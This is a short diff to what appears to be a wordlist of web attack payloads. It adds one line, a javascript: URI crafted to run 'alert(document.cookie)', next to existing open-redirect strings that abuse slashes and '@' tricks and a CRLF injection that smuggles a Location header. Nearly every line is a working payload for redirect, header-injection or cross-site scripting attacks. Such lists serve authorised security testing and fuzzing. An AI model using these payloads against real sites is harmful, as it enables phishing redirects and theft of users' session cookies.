@@ -9,6 +9,7 @@ crlftest%0dLocation:https://google.com
 ///example.com@google.com/%2f..
 ////google.com/%2f..
 ////example.com@google.com/%2f..
+/x:1/:///%01javascript:alert(document.cookie)/
 https://google.com/%2f..
 https://example.com@google.com/%2f..
 /https://google.com/%2f..
